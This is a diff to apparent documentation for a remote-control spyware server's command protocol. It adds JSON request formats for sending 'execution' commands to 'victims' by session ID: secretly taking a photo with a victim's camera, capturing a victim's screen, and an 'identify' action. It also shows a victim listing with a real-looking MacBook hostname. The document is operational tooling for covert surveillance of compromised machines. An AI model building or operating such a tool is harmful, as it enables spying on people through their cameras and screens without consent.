@@ -83,7 +83,7 @@ Victims Example:
                                 "hostname": "Aimin\u7684MacBook Pro", 
                                 "type":     "macos"
                             },
-                        "identified":       "true"
+                        "identified":       true
                     }
                 ],
             "total_victims": 1
@@ -110,12 +110,33 @@ Required Format (example):
 
 Execution Request Format (example):
 ```
+For screen shot:
 {
     "command":      "execution",
     "content": 
         {
             "session_id":   1,
-            "action":       "screenshot" or "picture",
+            "action":       "screenshot",
+            "para":         ""
+        }
+}
+For taking picture:
+{
+    "command":      "execution",
+    "content": 
+        {
+            "session_id":   1,
+            "action":       "picture",
+            "para":         ""
+        }
+}
+For identify victim
+{
+    "command":      "execution",
+    "content": 
+        {
+            "session_id":   1,
+            "action":       "identify",
             "para":         ""
         }
 }
@@ -131,16 +152,25 @@ Execution Request Format (example):
 #### Action Sets:
 1. picture:        take a picture using victims' camera (session_id specifies which victim to perform)
 2. screenshot:     get a screenshot of victim's machine (session_id specifies which victim to perform)
+3. identify:       identify victim (session_id specifies which victim to perform)
 
 
 ### Response Format
 
 Example:
 ```
+Response for screenshot or picture
 {
     "status":       "Success",
     "content_type": "text",
     "content":      "picture_1.jpg"
+}
+
+Response for identify command
+{
+    "status":       "Success",
+    "content_type": "boolean",
+    "content":      true
 }
 ```
 
